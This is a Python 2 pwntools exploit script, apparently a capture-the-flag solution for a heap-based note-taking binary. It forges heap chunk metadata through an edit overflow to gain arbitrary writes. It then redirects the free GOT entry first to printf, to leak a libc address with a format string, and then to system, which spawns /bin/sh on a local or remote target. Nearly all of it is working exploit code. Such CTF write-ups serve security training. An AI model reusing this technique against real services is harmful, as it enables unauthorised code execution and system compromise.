#!/usr/bin/env python2
# -*- coding:utf-8 -*-
from pwn import *
import os, sys

# switches
DEBUG = 1

# modify this
elf = ELF('./note')

os.environ['LD_LIBRARY_PATH'] = './'

if DEBUG:
    io = process('./note')
else:
    io = remote(sys.argv[1], int(sys.argv[2]))

if DEBUG: context(log_level='debug')
# define symbols and offsets here
# simplified r/s function
def ru(delim):
    return io.recvuntil(delim)

def rn(count):
    return io.recvn(count)

def ra(count):      # recv all
    buf = ''
    while count:
        tmp = io.recvn(count)
        buf += tmp
        count -= len(tmp)
    return buf

def sl(data):
    return io.sendline(data)

def sn(data):
    return io.send(data)

def info(string):
    return log.info(string)

def dehex(s):
    return s.replace(' ','').decode('hex')

# define interactive functions here
def add(title, size, content):
    ru('>>')
    sl('1')
    ru(':')
    sl(title)
    ru(':')
    sl(str(size))
    ru(':')
    sl(content)

def delete(id):
    ru('>>')
    sl('4')
    ru(':')
    sl(str(id))

def edit(id, offset, content):
    ru('>>')
    sl('3')
    ru(':')
    sl(str(id))
    ru(':')
    sl(str(offset))
    ru(':')
    if len(content) < 48:
        sl(content)
    else:
        sn(content)

def change(id, title):
    ru('>>')
    sl('5')
    ru(':')
    sl(str(id))
    ru(':')
    sl(title)

# define exploit function here
def pwn():
    
    for i in xrange(10):
        add('11111111', 0x70, '11111111')
    # change 9's prev and next
    payload = '1' + p64(0) + p64(0xa1) + p64(0x6020c8) + p64(0x6020d8) #have to bypass the 0x400c17 function
    payload = payload.ljust(47, '\x00')
    edit(8, 0x6f, payload)
    for i in range(1, 9):
        delete(i)
    delete(9)
    printf_got = 0x4007e0
    change(2, p64(0x602110)) #now point to 3 
    change(3, p64(11)) #change note num to avoid crashing
    change(2, p64(0x602048))
    change(3, p64(printf_got)[:-1])

    add('~%13$p~', 0x70, '11111111')
    delete(11)
    ru('~0x')
    libc_ret = int(ru('~')[:-1], 16)
    info('libc_ret = ' + hex(libc_ret))

    libc_ret_offset = 0x20a40
    l = ELF('./libc-64')
    system_offset = l.symbols['system']
    libc = libc_ret - libc_ret_offset
    system = libc + system_offset

    change(2, p64(0x602048))
    change(3, p64(system)[:-1])

    add('/bin/sh;', 0x70, '11111111')
    delete(12)


    io.interactive()
    return

if __name__ == '__main__':
    
    pause()
    pwn()
  
